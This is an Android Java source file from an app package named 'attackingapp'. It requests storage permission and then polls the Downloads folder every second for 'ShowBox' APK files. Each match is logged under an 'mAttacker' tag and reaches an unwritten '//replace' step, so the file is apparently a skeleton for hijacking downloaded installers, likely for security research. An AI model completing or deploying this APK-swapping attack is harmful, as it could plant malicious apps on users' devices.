package com.cybernetivdigital.attackingapp;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {

    Timer timer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        init();
    }

    private void init() {
        timer = new Timer();

    }

    @Override
    protected void onResume() {
        super.onResume();

        if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
            timer.schedule(new Monitor(), 0, 1000);
        } else {
            timer.schedule(new Monitor(), 0, 1000);
        }
    }
}

class Monitor extends TimerTask {
    @Override
    public void run() {
        String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString();
        File directory = new File(path);
        File[] files = directory.listFiles();
        for (File file : files)
            if (checkShowBox(file)) {
                //replace
            }
    }

    private Boolean checkShowBox(File file) {
        if ((file.getName().toLowerCase().contains("show box") || file.getName().toLowerCase().contains("showbox") || file.getName().toLowerCase().contains("show_box")) && (file.getName().contains(".apk"))) {
            Log.d("mAttacker", "Show box appeared: " + file.getName());
            return true;
        }
        return false;
    }
}
